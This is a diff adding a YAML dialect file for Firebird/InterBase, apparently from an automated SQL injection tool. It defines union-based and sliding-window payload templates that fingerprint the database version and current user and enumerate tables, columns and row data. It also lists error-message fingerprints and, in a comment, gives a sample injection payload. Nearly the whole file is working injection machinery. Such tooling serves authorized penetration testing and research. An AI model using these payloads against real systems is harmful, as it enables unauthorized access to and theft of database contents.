@@ -1,0 +1,86 @@
+vendor: ""
+resource: 
+ info: |
+  SELECT 
+      rdb$get_context('SYSTEM', 'ENGINE_VERSION')
+      || '${ENCLOSE_VALUE_SQL}'
+      || rdb$get_context('SYSTEM', 'DB_NAME')
+      || '${ENCLOSE_VALUE_SQL}'
+      || rdb$get_context('SYSTEM', 'CURRENT_USER')
+      || '${TRAIL_SQL}'
+  from rdb$database
+ schema: 
+  database: |
+   /**
+    * aggreg function return exec fault
+    * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
+    * => use limit 1,1 instead
+    */
+   select 
+       '${ENCLOSE_VALUE_SQL}'
+       || rdb$get_context('SYSTEM', 'DB_NAME')
+       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+   from rdb$database
+   {limit}
+  table: |
+   SELECT 
+       '${ENCLOSE_VALUE_SQL}'
+       || trim(rdb$relation_name)
+       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+   from rdb$relations
+   {limit}
+  column: |
+   SELECT 
+       '${ENCLOSE_VALUE_SQL}'
+       || trim(rdb$field_name)
+       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+   from rdb$relation_fields
+   where rdb$relation_name = '${TABLE}'
+   {limit}
+  row: 
+   query: |
+    SELECT 
+        '${ENCLOSE_VALUE_SQL}'
+        || ${FIELDS}
+        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+    from ${TABLE}
+    {limit}
+   fields: 
+    field: "trim(coalesce(${FIELD}, ''))"
+    concat: "|| '%7f' ||"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   select
+       /**
+        * If reach end of string (${LEAD}i) then NULLIF nullifies the result
+        */
+       '${LEAD}'
+       || NULLIF(
+           substring(
+               (${INJECTION})
+               from ${INDEX} 
+               for 65536
+           ),
+           '${TRAIL_SQL}'
+       )
+       from RDB$DATABASE
+  limit: "ROWS ${LIMIT} TO ${LIMIT}"
+  failsafe: "(1337${INDICE}7330%2b1)"
+  calibrator: |
+   rpad(
+       '${CALIBRATOR_SQL}', 
+       1024, 
+       '${CALIBRATOR_SQL}'
+   )
+  limitBoundary: 1
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - "Warning: ibase_query()"
+    - "function.ibase-query"
+    - "Unexpected end of command - line"
+ normal: 
+  indices: "union select ${INDICES} from RDB$DATABASE"
+  capacity: "(select '${LEAD}${INDICE}' || ${CALIBRATOR} from RDB\\$DATABASE)"
+  orderBy: "order by 1337"
